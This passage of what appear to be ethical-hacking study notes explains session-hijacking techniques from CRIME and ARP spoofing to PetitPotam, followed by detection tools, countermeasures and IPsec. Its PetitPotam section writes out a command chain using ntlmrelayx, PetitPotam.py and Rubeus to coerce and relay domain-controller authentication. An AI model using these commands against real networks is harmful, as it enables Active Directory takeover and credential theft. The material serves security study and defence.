				- Sniffing HTTPS Traffic: If the victim has already established an HTTPS connection with a secured web application, the attacker intercepts the victim’s HTTPS traffic using techniques such as ARP spoofing.
				- Capturing Cookies: The attacker captures the authentication cookie from the victim’s HTTPS traffic. Since cookies are compressed and encrypted, the attacker cannot directly read the cookie value.
				- Sending Malicious HTTPS Requests: The attacker sends multiple HTTPS requests to the web application, each with the captured cookie value prepended by random characters.
				- Analyzing Compression Length: By observing the size of the encrypted and compressed HTTPS responses, the attacker identifies patterns in the compression ratio. These patterns allow the attacker to infer the actual value of the authentication cookie by analyzing the length of the data sent.
				- Hijacking the Session: Once the attacker predicts the authentication cookie, they use it to impersonate the victim and hijack their session with the web application. This allows the attacker to access confidential information such as passwords, social security numbers, and credit card details.
		- Detection and Tools: Attackers commonly use tools like CrimeCheck to detect whether a web server has TLS or HTTP compression enabled. If compression is enabled, the server is vulnerable to CRIME attacks.
	- Session Hijacking Using Forbidden Attack:
		- A forbidden attack is a type of man-in-the-middle (MITM) attack that occurs when a cryptographic nonce is reused during the establishment of an HTTPS session with a server. According to TLS specifications, nonces (arbitrary, one-time-use pieces of data) must never be reused. This attack exploits vulnerabilities in TLS implementations where the same nonce is mistakenly reused during data encryption with the Advanced Encryption Standard–Galois/Counter Mode (AES-GCM) in the TLS handshake.
		- Reusing a nonce during the TLS handshake allows attackers to perform a MITM attack by generating cryptographic keys used for authentication. This enables them to monitor, hijack, and manipulate the connection. After bypassing HTTPS protections, the attacker can inject malicious code or forged content, such as JavaScript or fake web forms, prompting the victim into disclosing confidential information like bank account details, passwords, or social security numbers.
		- Steps in Forbidden Attack:
			- The attacker monitors the connection between the victim and the web server and sniffs the nonce from the TLS handshake messages.
			- The attacker generates authentication keys using the nonce and hijacks the connection.
			- All the traffic between the victim and the web server flows through the attacker’s machine.
			- The attacker injects JavaScript code or fake web fields into the transmission towards the victim.
			- The victim reveals sensitive information such as bank account numbers, passwords, and social security numbers to the attacker.
	- Session Hijacking Using Session Donation Attack:
		- In a session donation attack, the attacker donates their own session ID to the target user. To carry out this attack, the attacker first obtains a valid session ID by logging into a service and then provides the same session ID to the target user. This session ID links the target user to the attacker’s account page without revealing any information to the victim. When the target user clicks the link and enters their details (such as username, password, or payment information) in a form, the entered details are linked to the attacker’s account.
		- To initiate this attack, the attacker can use techniques such as cross-site scripting (XSS), man-in-the-middle (MITM) attacks, or session fixation to send their session ID to the target.
		- Steps in Session Donation Attack:
			- First, the attacker logs into a service, establishes a legitimate connection with the target web server, and deletes any stored information.
			- The target web server (e.g., http://citibank.com/) issues a session ID, such as 0D6441FEA4496C2, to the attacker.
			- The attacker then donates their session ID (e.g., http://citibank.com/?SID=0D6441FEA4496C2) to the victim and lures the victim into clicking it to access the website.
			- The victim clicks the link, believing it to be legitimate, and it opens the server’s page in the victim’s browser with the session ID (SID=0D6441FEA4496C2). The victim then enters their information on the page and submits it.
			- The attacker can now log in as themselves and acquire the victim’s information.
- Network-Level Session Hijacking:
	- Network-level session hijacking relies on compromising transport and Internet protocols used by web applications at the application layer. By targeting network-level sessions, attackers can gather critical information that is used to exploit application-level sessions.
	- Three-way Handshake:
		- The TCP three-way handshake establishes a connection between two parties by exchanging essential parameters. First, the client, in the CLOSED state, sends its Initial Sequence Number (ISN) with the SYN flag, transitioning to the SYN-SENT state.
		- The server, in the LISTENING state, acknowledges the client’s ISN, sends its own ISN with the SYN flag, and moves to the SYN-RECEIVED state.
		- Finally, the client acknowledges the server’s ISN and transitions to the ESTABLISHED state, with the server doing the same upon receiving the acknowledgment, enabling communication.
		- To terminate the connection, the RST flag forces an immediate shutdown to the CLOSED state, while the FIN flag initiates a graceful closure, transitioning to the CLOSE-WAIT state.
		- For packets to be accepted during communication, their sequence numbers must fall within the expected range; otherwise, they are dropped, and an acknowledgment with the expected sequence number is sent. Successful communication requires IP addresses, port numbers, and sequence numbers.
		- An attacker can easily determine the IP address and port number, as these are visible in the IP packets and remain constant throughout the session. However, sequence numbers change with each packet, making them harder to predict. For a blind hijack, the attacker must accurately guess the sequence numbers.
		- If the attacker successfully tricks the server into accepting and executing spoofed packets, they can hijack the session. By anticipating the next sequence number and acknowledgment (ACK) number that the client will send, the attacker can spoof the client’s address and initiate communication with the server.
	- Types of Network-Level Session Hijacking:
		- TCP/IP Hijacking:
			- TCP/IP hijacking involves an attacker intercepting an established connection between two communicating parties by using spoofed packets to impersonate one of them. The attacker redirects the TCP traffic to their own machine, causing the victim’s connection to hang. The attacker can then communicate with the host machine on the victim’s behalf.
			- To carry out a TCP/IP hijacking attack, the attacker must be on the same network as the victim, while the target server and victim machine can be located anywhere. This technique is particularly effective against systems that rely on one-time passwords.
			- TCP/IP Hijacking Steps:
				- In TCP/IP hijacking, the attacker intercepts a victim’s connection and uses their IP address to send spoofed packets with predicted sequence numbers.
				- The receiver processes the spoofed packet, updates the sequence number, and sends an acknowledgment (ACK) to the victim.
				- Unaware of the spoofed packet, the victim ignores the ACK, leading to a desynchronized connection.
				- The attacker then continuously sends spoofed packets, maintaining communication with the receiver while the victim’s connection hangs.
				- The server mistakenly drops packets from the victim, allowing the attacker to successfully hijack the session and control the communication.
		- IP Spoofing (Source-Routed Packets):
			- Source routed packets allow attackers to gain unauthorized access by using a trusted host’s IP address. This type of attack enables the attacker to create acceptable packets to insert into an active TCP session. The attacker first spoofs the trusted host’s IP address, tricking the server into accepting packets as if they were from the trusted host. Using the source-routing technique, the attacker specifies the path the packets take from the source to the destination, convincing the server it is communicating with the legitimate user.
			- After successfully spoofing the IP address, the attacker manipulates the sequence and acknowledgment (ACK) numbers. The forged packets are then injected into the TCP session before the client can respond. This leads to a desynchronized state, as the sequence and ACK numbers are no longer aligned. The original packets from the client are lost because the server processes the attacker’s packet with a new Initial Sequence Number (ISN). Subsequent packets are also source routed to a destination specified by the attacker, completing the hijack.
		- RST Hijacking:
			- RST hijacking involves injecting an authentic-looking (forged) reset (RST) packet into an active connection using a spoofed source IP address and a predicted acknowledgment (ACK) number. If the attacker accurately predicts the ACK number, the victim accepts the reset packet as legitimate and terminates the connection, believing it was sent by the source.
			- This attack can be executed using packet-crafting tools such as Colasoft Packet Builder and TCP/IP analysis tools such as tcpdump.
		- Blind Hijacking:
			- In blind hijacking, an attacker injects malicious data or commands into an intercepted TCP session, even when source-routing is disabled. To perform this attack, the attacker must correctly guess the next Initial Sequence Number (ISN) of a computer attempting to establish a connection.
			- While the attacker can send malicious data or commands, such as altering password settings to gain access from another location, they cannot view the response. To see the response, a Man-in-the-Middle (MITM) attack would be a more effective option.
		- UDP Hijacking:
			- The User Datagram Protocol (UDP) does not use packet sequencing or synchronization, making UDP sessions more vulnerable to attacks than TCP sessions. Since UDP is connectionless, it is easier to modify data without the victim noticing. In a network-level session hijack, the attacker sends a forged server reply to a client’s UDP request before the server can respond, taking control of the session.
			- The server’s reply can be easily intercepted using sniffing techniques. A Man-in-the-Middle (MITM) attack can further facilitate UDP hijacking by preventing the server's reply from reaching the client in the first place.
			- UDP Hijacking Working:
				- Spoofing the Source IP Address: Since UDP does not require a handshake before data transmission, attackers can send UDP packets with a spoofed source IP address, impersonating another host.
				- Intercepting Traffic: The attacker sends forged UDP packets to either the client or server. These packets appear to come from a legitimate source but may contain malicious data or instructions.
				- Manipulating Communication: By injecting false information into the data stream or initiating unauthorized requests, the attacker can manipulate the behavior of an application relying on UDP traffic.
		- Man-in-The-Middle (Packet Sniffing) Attack Using Forged ICMP and ARP Spoofing:
			- An MITM (Man-in-the-Middle) attack involves intercepting communication between a client and server using a packet sniffer. The attacker changes the client’s default gateway to reroute packets through their own machine.
			- This is achieved through two techniques: Forged ICMP and ARP Spoofing. In both methods, the attacker manipulates the routing of packets in transit between the client and server, redirecting them through the attacker’s machine.
			- Forged Internet Control Message Protocol (ICMP):
				- The Internet Control Message Protocol (ICMP) is an extension of IP used to send error messages. In this attack, the attacker forges ICMP packets to deceive the client and server. These forged ICMP packets are used to redirect traffic between the client and server through the hijacker’s machine. The attacker sends error messages, falsely indicating issues in processing packets via the original connection, which causes the client and server to route traffic through the attacker’s path instead.
			- Address Resolution Protocol (ARP) Spoofing:
				- Hosts use Address Resolution Protocol (ARP) to map IP addresses to MAC (hardware) addresses. ARP spoofing involves manipulating the ARP tables of hosts by broadcasting false ARP replies. The attacker sends forged ARP replies to update the ARP tables of hosts that are broadcasting ARP requests. This causes the traffic to be routed through the attacker’s machine instead of the legitimate destination IP address.
		- PetitPotam Hijacking:
			- In a PetitPotam attack, an attacker forces a domain controller (DC) to initiate authentication to the attacker’s server. The attacker uses Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC) API to hijack the authentication session. The attacker’s SMB server manipulates the session, making the domain controller believe the attacker is a legitimate user, thus allowing the attacker to capture the domain controller’s NTLM hash. To carry out this attack, the attacker must have valid credentials of a legitimate user within the network.
			- Once the attacker obtains the NTLM hash, they relay it to the Active Directory Certificate Services (AD CS) to generate a certificate. In some cases, AD CS may also act as the domain controller. Using the generated certificate, the attacker gains administrative privileges, taking full control of the AD server and, by extension, the entire network managed by the domain controller.
			- PetitPotam Hijacking Steps:
				- The attacker uses previously captured NTLM credentials to authenticate with the target server.
				- The attacker utilizes the EfsRpcOpenFileRaw command from the MS-EFSRPC API to coerce the target server into performing NTLM authentication for another system.
				- The attacker then initiates an NTLM relay attack to gain remote access to the target Active Directory Certificate Services (AD CS).
				- Finally, the attacker creates an AD certificate, which grants administrative privileges to the target AD server.
			- Commands to Perform PetitPotam Hijacking Attack:
				- Use the following command to identify the certificate authority:
					=> certutil.exe
				- Use the following command from the Impacket toolkit to set up HTTP/SMB configuration and capture credentials from the domain controller (DC):
					=> ntlmrelayx.py -t <URL of Certificate Authority with web enrollment> -smb2support --adcs --template DomainController
				- To force authentication using the captured credentials via the MS-EFSRPC API call, run:
					=> python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>
				- If the DC is vulnerable, you can launch PetitPotam without credentials to receive the certificate’s NTLM hashes by running:
					=> python3 PetitPotam.py <Attacker’s IP> <IP of DC>
				- After obtaining the NTLM hashes, use password-cracking tools like Rubeus to request a Kerberos ticket for the machine containing DC account privileges:
					=> Rubeus.exe asktgt /outfile:<output_file.kirbi> /dc:<DC-IP> /domain:<domain name> /user:<Domain username> /ptt /certificate:<NTLM hashes received from above command>
- Session Hijacking Tools:
	- Hetty (github.com) :  Hetty is an HTTP toolkit designed for security research, enabling attackers to perform man-in-the-middle (MITM) HTTP proxy attacks. It utilizes logs and advanced search functionalities to enhance the attack process. Hetty offers several features, including a MITM HTTP proxy with logging and advanced search capabilities, an HTTP client for manually creating and editing requests as well as replaying proxied ones, and the ability to intercept and manually review requests and responses by editing, sending, receiving, or canceling them.
	- Caido (caido.io) : Caido is a web security auditing toolkit designed for security professionals to intercept and view HTTP requests in real time while browsing. It allows customization and testing of requests against large wordlists, automatically modifies incoming requests using regex rules, and enables the manual resending of requests to test endpoints.
	- bettercap (www.bettercap.org) : Bettercap is a portable framework written in Go that enables security researchers, red teamers, and reverse engineers to perform reconnaissance and execute various attacks on Wi-Fi networks, Bluetooth Low Energy devices, wireless HID devices, and IPv4/IPv6 networks.
	- Burp Suite (portswigger.net)
	- OWASP ZAP (www.zaproxy.org)
	- WebSploit Framework (sourceforge.net)
	- sslstrip (pypi.org)
	- JHijack (sourceforge.net)
- Session Hijacking Countermeasures:
	- All networks using TCP/IP are vulnerable to various types of session hijacking attacks. These attacks are particularly difficult to detect, and users often fail to notice them unless the attacker causes significant damage.
	- Signs of Session Hijacking Attack:
		- A sudden surge in network activity, leading to decreased system performance.
		- Overloaded servers due to simultaneous requests from both the legitimate client and the hijacker.
	- Session Hijacking Detection Methods:
		- Manual Method (Using Packet Sniffing Software)
			- The manual method involves using packet-sniffing software such as Wireshark and SteelCentral Packet Analyzer to monitor session hijacking attacks. The packet sniffer captures packets in transit across the network, which are then analyzed using various filtering tools.
			- Forced ARP Entry:
				- A forced ARP entry involves replacing the MAC address of a compromised machine in the server's ARP cache with a different one to restrict network traffic to the compromised machine.
				- A forced ARP entry should be performed in the following cases:
					- Repeated ARP updates
					- Frames exchanged between the client and server with different MAC addresses
					- ACK storms
		- Automatic Method (IDS and IPS):
			- The automatic method involves using intrusion detection systems (IDS) and intrusion prevention systems (IPS) to monitor incoming network traffic. If a packet matches any attack signature in the internal database, the IDS generates an alert, while the IPS blocks the traffic from entering the network.
	- Protecting Against Session Hijacking:
		- Use Secure Shell (SSH) to establish a secure communication channel.
		- Transmit authentication cookies over HTTPS connections.
		- Generate a new session ID upon login and accept only server-generated IDs.
		- Enforce session timeouts and automatically destroy expired sessions.
		- Avoid including session IDs in URLs or query strings.
		- Encrypt data in transit and implement a defense-in-depth strategy.
		- Use long random session keys for security.
		- Require multifactor authentication (MFA) or strong authentication like Kerberos.
		- Switch from a hub network to a switch network to reduce ARP spoofing risks.
		- Configure anti-spoofing rules on gateways.
		- Use IDS/IPS or ARPwatch to monitor ARP cache poisoning.
		- Implement IPsec to encrypt session data.
		- Use VPNs like PPTP or L2TP for secure remote connections.
		- Restrict cookies using firewalls and browser settings.
		- Enable HTTPOnly and SameSite cookie attributes.
		- Disable HTTP compression to prevent compression-based attacks.
		- Regularly update platform patches, browsers, and security configurations.
		- Monitor session activity for unusual behavior, such as multiple logins from different locations.
		- Educate users on logging out properly and using strong, unique passwords.
		- Implement continuous authentication using behavioral biometrics like typing patterns.
		- Use a challenge-response mechanism (e.g., CAPTCHA) when suspicious activity is detected.
		- Enforce an absolute session timeout, regardless of user activity.
	- Web Development Guidelines to Prevent Session Hijacking:
		- Attackers typically hijack sessions by exploiting vulnerabilities in session establishment mechanisms. Web developers often overlook security, but following these guidelines during development can help minimize or eliminate the risk of session hijacking:
			- Create session keys using long, random strings or numbers to make them difficult to guess.
			- Regenerate the session ID after a successful login to prevent session fixation attacks.
			- Encrypt both session data and the session key during transmission between users and web servers.
			- Implement SSL/TLS to encrypt all network communication.
			- Expire sessions immediately when the user logs out.
			- Prevent eavesdropping within the network.
			- Reduce the lifespan of sessions and cookies.
			- Use restrictive cache directives for HTTP and HTTPS traffic, such as:
				- "Cache-Control: no-cache, no-store"
				- "Pragma: no-cache"
				- Equivalent META tags on all, or at least sensitive, web pages.
			- Avoid creating sessions for unauthenticated users unless necessary.
			- Use the HTTPOnly attribute for cookies storing session IDs.
			- Set the Secure flag on cookies to ensure they are only sent over HTTPS and encrypt them before transmission.
			- Verify that all session requests originate from the same IP address and user agent.
			- Implement continuous device verification to ensure the session remains controlled by the legitimate user.
			- Use risk-based authentication at different levels before granting access to sensitive information.
			- Perform authentication and integrity verification between VPN endpoints.
			- Destroy server-side sessions upon user deauthentication instead of relying solely on session expiration.
			- Ensure that the web application redirects HTTP requests to HTTPS using server settings or redirection techniques.
			- Require user re-authentication and generate a new session before granting access to sensitive functions.
			- Use secure session management provided by trusted web frameworks instead of implementing custom session handling.
			- Enforce HTTPS on all pages of the web application, not just the login pages.
	- Web User Guidelines to Prevent Session Hijacking:
		- Avoid clicking on links received through emails or instant messages (IMs).
		- Use firewalls to block malicious content and restrict cookie access.
		- Ensure that websites are certified by trusted certifying authorities.
		- Clear history, offline content, and cookies after confidential transactions.
		- Prefer HTTPS over HTTP when transmitting sensitive data.
		- Always log out by clicking the logout button instead of just closing the browser.
		- Disable or remove untrusted add-ons, enabling them only when necessary.
		- Use one-time passwords (OTP) for critical transactions (e.g., credit card payments).
		- Regularly update antivirus software to prevent malware from stealing cookies.
		- Avoid accessing sensitive accounts or making financial transactions over public Wi-Fi.
		- Disable auto-connect to open Wi-Fi networks.
		- Keep your operating system, browsers, and plugins up to date.
		- Use encrypted messaging and email services for sensitive communication.
		- Avoid saving passwords in browsers.
		- Use incognito mode on shared computers.
		- Be cautious when granting apps access to sensitive information.
		- Use secure session handlers for storing and managing session tokens.
	- Session Hijacking Detection Tools:
		- USM Anywhere (cybersecurity.att.com): USM Anywhere (AT&T Cybersecurity) is a comprehensive security tool that provides threat detection, incident response, and compliance management across cloud, on-premises, and hybrid environments. Security professionals use it to detect session hijacking attempts and perform asset discovery, intrusion detection, security automation, SIEM and log management, endpoint detection and response (EDR), threat detection and intelligence, and vulnerability assessment.
		- Wireshark (Wireshark.org) : Wireshark is a network protocol analyzer that captures and analyzes live network traffic. It supports various network types, including Ethernet, IEEE 802.11 (Wi-Fi), PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI. Wireshark relies on WinPcap to capture packets, allowing security professionals to monitor and detect session hijacking attempts in real time by analyzing network activity and identifying suspicious behavior.
		- Quantum Intrusion Prevention System (IPS) (www.checkpoint.com)
		- SolarWinds Security Event Manager (www.solarwinds.com)
		- IBM Security Network Intrusion Prevention System (www.ibm.com)
		- LogRhythm (logrhythm.com)
	- Approaches to Prevent Session Hijacking:
		- HTTP Strict Transport Security (HSTS):
			- HTTP Strict Transport Security (HSTS) is a web security policy designed to protect HTTPS websites from man-in-the-middle (MITM) attacks. It enforces secure communication by requiring web browsers to interact with the server exclusively over HTTPS, automatically converting all insecure HTTP connections to HTTPS.
			- This ensures that all communication between the web server and browser remains encrypted and that responses originate from an authenticated server, preventing session hijacking attempts.
		- Token Binding:
			- Token Binding enhances security by protecting client-server communication against session hijacking. When a user logs into a web application, a session ID (token) is generated and used to authenticate requests. Attackers can hijack a session by capturing and reusing this token. With token binding, the client generates a unique public-private key pair for each connection.
			- Upon connecting to the server, the client signs a message using its private key and sends it along with its public key. The server then verifies the signature using the public key, ensuring that only the legitimate client—who holds the private key—can initiate the session. Since each connection uses a new key pair, an attacker cannot reuse a captured signature, making session hijacking significantly more difficult.
	- Approaches to Prevent MITM Attacks:
		- Man-in-the-middle (MITM) attacks occur when attackers intercept traffic between two endpoints. These attacks are often passive, making them difficult for victims to detect. Since detection is challenging, prevention is the most effective defense.
		- The following approaches help prevent MITM attacks:
			- DNS over HTTPS (DoH): DNS over HTTPS (DoH) is an enhanced version of the DNS protocol designed to prevent attackers and ISPs from snooping on users’ web activities or DNS queries during the lookup process. Unlike traditional DNS, DoH encrypts DNS queries using HTTPS, sending them through port 443 to blend with regular HTTPS traffic, making interception significantly harder. DoH also improves privacy by sending only a portion of the requested domain name to fetch results, rather than the full URL. This prevents attackers from reconstructing browsing behavior. Major web browsers like Chrome, Mozilla Firefox, and Microsoft Edge have supported DoH for years, with Mozilla making it the default for U.S. users in 2020.
			- WPA3 Encryption: Wi-Fi Protected Access 3 (WPA3) is a wireless security protocol designed to enhance encryption and authentication in Wi-Fi networks. It prevents unauthorized users from connecting to a network by using stronger encryption mechanisms. Unlike its predecessor (WPA2), WPA3 offers protection against brute-force attacks, making it significantly harder for attackers to gain access and conduct MITM attacks.
			- VPN (Virtual Private Network): A VPN creates an encrypted tunnel over a public network, ensuring secure transmission of sensitive data between endpoints. By using key-based encryption, VPNs prevent attackers from intercepting or decrypting communication, reducing the risk of MITM attacks.
			- Two-Factor Authentication (2FA): Two-factor authentication adds an extra layer of security by requiring users to provide a second verification factor (e.g., a one-time code sent to their phone) in addition to their password. This prevents attackers from easily compromising accounts, even if they steal login credentials, reducing the risk of session hijacking and brute-force attacks.
			- Password Manager: A password manager is a tool used to securely store and manage credentials. It generates strong, unique passwords for web applications and encrypts them under a master key, preventing attackers from intercepting and exploiting weak passwords in MITM attacks.
			- Zero-Trust Principles: Zero-trust security follows the principle of "Never trust, always verify." It requires strict authentication and access controls for all users, whether they are inside or outside the network. Even internal users must undergo authentication, minimizing the risk of unauthorized access and MITM attacks.
			- Public Key Infrastructure (PKI): Public Key Infrastructure (PKI) is a framework for managing digital certificates to establish secure communication. It ensures that entities involved in communication are legitimate by verifying certificates issued by trusted Certificate Authorities (CAs). Any attempt to use a fake certificate can be detected, preventing MITM attacks.
			- Network Segmentation: Network segmentation involves dividing a network into smaller, isolated sub-networks to enhance security. This limits an attacker’s ability to move laterally within the network and intercept communications, reducing the risk of MITM attacks and unauthorized access to sensitive data.
	- IPsec (Internet Protocol Security):
		- IPsec is a protocol suite developed by the Internet Engineering Task Force (IETF) to secure IP communications by authenticating and encrypting each IP packet in a communication session. It provides cryptographically based security for both IPv4 and IPv6, ensuring secure data transmission over networks.
		- IPsec supports various security features, including network-level peer authentication, data origin authentication, data integrity verification, encryption for data confidentiality, and replay protection. It is commonly used to implement VPNs and to enable secure remote access to private networks via dial-up connections. IPsec operates in two encryption modes: transport mode and tunnel mode, with both communicating devices required to share a public key for secure communication.
		- IPsec policies can be configured and managed through Group Policy settings within Active Directory, allowing administrators to enforce security policies at the domain, site, or organizational unit level. At the IP layer, IPsec provides comprehensive security, protecting both IP and upper-layer protocols such as TCP, UDP, ICMP, and BGP. Its robust security capabilities make it a key component in modern secure networking.
		- Security Services Provided by IPsec:
			- Replay Attack Protection (prevention of packet retransmission attacks)
			- Data Confidentiality (encryption to protect sensitive information)
			- Access Control (restricting unauthorized access)
			- Connectionless Integrity (ensuring that transmitted data is not altered)
			- Data Origin Authentication (verifying the source of transmitted data)
			- Data Integrity (ensuring data remains unaltered in transit)
			- Limited Traffic-flow Confidentiality (hiding metadata about traffic patterns)
			- Network-level Peer Authentication (verifying the legitimacy of communicating devices)
		- Components of IPsec:
			- IPsec Driver: A software component responsible for performing protocol-level functions required to encrypt and decrypt packets.
			- Internet Key Exchange (IKE): A protocol that generates security keys for IPsec and other cryptographic protocols, enabling secure communication.
			- Internet Security Association and Key Management Protocol (ISAKMP): A framework that establishes and manages security associations (SAs), allowing two computers to communicate securely by encrypting exchanged data.
			- Oakley: A key exchange protocol that utilizes the Diffie-Hellman algorithm to generate a master key and session-specific keys for IPsec data transfer.
			- IPsec Policy Agent: A Windows OS service that enforces IPsec policies for all network communications initiated from the system.
		- Steps in the IPsec Process:
			- The consumer sends a message to the service provider.
			- The consumer's IPsec driver checks the outgoing packet's address or type against the IP filter.
			- If a match is found, the IPsec driver notifies ISAKMP to initiate security negotiations with the service provider.
			- The service provider's ISAKMP receives the security negotiation request.
			- Both parties initiate a key exchange, establishing an ISAKMP Security Association (SA) and a shared secret key.
			- Both parties agree on the security level for the information exchange, establishing IPsec SAs and encryption keys.
			- The consumer's IPsec driver encrypts and transfers packets to the appropriate connection type for transmission to the service provider.
			- The service provider receives the encrypted packets and transfers them to its IPsec driver.
			- The service provider's IPsec driver uses the inbound SA and key to verify the digital signature and begin decryption.
			- The provider's IPsec driver transfers the decrypted packets to the OSI transport layer for further processing.
		- Modes of IPsec:
			- The configuration of IPsec involves two different modes: tunnel mode and transport mode. These modes are associated with the functions of two core protocols: Encapsulation Security Payload (ESP) and Authentication Header (AH). The choice of mode depends on the specific requirements and implementation of IPsec.
			- Transport Mode:
				- In transport mode, IPsec encrypts only the payload of the IP packet while leaving the IP header intact. This ensures that only the data payload is encrypted or authenticated. Transport mode is primarily used for end-to-end communication between two hosts.
				- For Encapsulation Security Payload (ESP) in transport mode, IPsec encrypts only the payload, leaving the header unchanged. It authenticates the two connected computers and offers optional encryption for data transfer. Additionally, it is compatible with Network Address Translation (NAT), making it suitable for VPN services in NAT-based networks.
			- Tunnel Mode:
				- In tunnel mode, IPsec encapsulates the entire IP packet, including both the payload and the original IP header, and then encrypts the entire packet. This encapsulated packet becomes the payload of a new IP packet with a new IP header.
				- For Authentication Header (AH) in tunnel mode, IPsec authenticates both the payload and the header, providing higher security than transport mode. Once the encrypted data is received, the IPsec-compliant device decrypts it. Tunnel mode is commonly used to create VPNs over the Internet for network-to-network communication (e.g., between routers and linked sites), host-to-network communication (e.g., remote user access), and host-to-host communication (e.g., private chat). It is compatible with Network Address Translation (NAT) and supports NAT traversal.
				- In tunnel mode, Encapsulation Security Payload (ESP) encrypts and optionally authenticates the entire inner IP packet, while AH authenticates the entire inner IP packet along with selected fields of the outer IP header. Tunnel mode is typically used between two gateways or between a host and a gateway.
		- IPsec Architecture:
			- IPsec provides security services at the network layer, offering flexibility in selecting the necessary security protocols and the algorithms used for these services. To meet the required security objectives, corresponding cryptographic keys may be employed when necessary. The security services provided by IPsec include access control, data origin authentication, connectionless integrity, anti-replay protection, and confidentiality. To achieve these objectives, IPsec utilizes two traffic security protocols, AH and ESP, along with cryptographic key management protocols and procedures.
			- Protocol Structure of the IPsec Architecture:
				- Authentication Header (AH): Provides integrity and data origin authentication, with an optional anti-replay feature.
				- Encapsulating Security Payload (ESP): Offers all the services provided by AH, along with confidentiality.
				- IPsec Domain of Interpretation (DOI): Defines payload formats, types of exchanges, and naming conventions for security information such as cryptographic algorithms and security policies. IPsec DOI enables ISAKMP for use with IP when IPsec relies on ISAKMP to negotiate security associations.
				- Internet Security Association and Key Management Protocol (ISAKMP): A key protocol in the IPsec architecture that establishes the required security for various types of communications—including government, private, and commercial—by integrating authentication, key management, and security associations.
				- Policy: IPsec policies help enforce network security by defining when and how to secure data, as well as specifying security methods at different network levels. These policies can be configured to meet the security requirements of a system, domain, site, organizational unit, and more.
		- IPsec Authentication and Confidentiality:
			- IPsec employs two different security services for authentication and confidentiality:
			- Authentication Header (AH): AH provides connectionless integrity, data origin authentication, and optional anti-replay protection for the data payload and certain portions of the IP header in each packet. However, it does not support data confidentiality (encryption). When establishing a Security Association (SA), the receiver can opt for anti-replay protection as an additional security measure.
			- Encapsulating Security Payload (ESP): ESP offers confidentiality in addition to the services provided by AH, including data origin authentication, connectionless integrity, and anti-replay protection. However, in transport mode, ESP does not provide integrity and authentication for the entire IP packet. ESP can be used alone, in combination with AH, or in a nested configuration. By default, it protects only the IP data payload. In tunnel mode, it secures both the payload and the IP header.
	- Session Hijacking Prevention Tools:
		- Checkmarx One SAST (checkmarx.com): Checkmarx One SAST is a comprehensive source-code analysis solution designed to identify, track, and fix both technical and logical flaws in source code, including security vulnerabilities, compliance issues, and business logic problems. CxSAST supports open-source analysis (CxOSA), allowing for licensing and compliance management, vulnerability alerts, policy enforcement, and reporting. This tool is compatible with a wide range of operating systems, programming languages, and frameworks. Security professionals can use this tool to prevent various session hijacking attacks, including Man-in-the-Middle (MITM) attacks, session fixation attacks, and Cross-Site Scripting (XSS) attacks.
		- Fiddler (www.telerik.com): Fiddler is a web debugging proxy used for security testing of web applications. It can decrypt HTTPS traffic and manipulate requests through an MITM decryption technique. Fiddler logs all HTTP(S) traffic between a computer and the Internet. Security professionals can use Fiddler to test web applications by debugging traffic from systems and manipulating or editing web sessions.
		- Nessus (www.tenable.com)
		- Invicti (www.invicti.com)
		- Wapiti (wapiti-scanner.github.io)


--------------------------------------------------

# Evading IDS, Firewalls, and Honeypots
